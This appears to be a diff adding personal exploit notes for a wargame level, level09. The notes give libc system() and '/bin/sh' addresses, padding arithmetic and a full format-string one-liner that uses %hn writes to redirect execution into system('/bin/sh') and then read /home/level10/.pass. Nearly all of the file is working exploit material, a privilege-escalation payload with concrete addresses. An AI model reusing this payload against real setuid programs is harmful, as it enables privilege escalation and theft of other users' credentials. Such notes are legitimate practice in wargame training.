@@ -1,0 +1,20 @@
+eip at 0xbffffe0c eip = 0xb7e26276
+0xb7e48b30 <__libc_system>
+libc : 0xb7f6ae48 ("/bin/sh")
+
+0xbffffe0c:	0x8b30
+0xbffffe0e:	0xb7e4
+0xbffffe10:	0x0002
+0xbffffe12:	0x0000
+0xbffffe14:	0xae48
+0xbffffe16:	0xb7f6
+
+0x8b30 - 16 = 35616
+9000
+0xae48  = 44616
+2460
+0xb7e4  = 47076
+18
+0xb7f6  = 47094
+
+env - /levels/level09 $(perl -e 'print pack(l,0xbffffe0c) . pack(l,0xbffffe14) . pack(l,0xbffffe0e) . pack(l,0xbffffe16) . "%35616x%4\$hn%8984x%5\$hn%2460x%6\$hn%18x%7\$hn; cat /home/level10/.pass"')
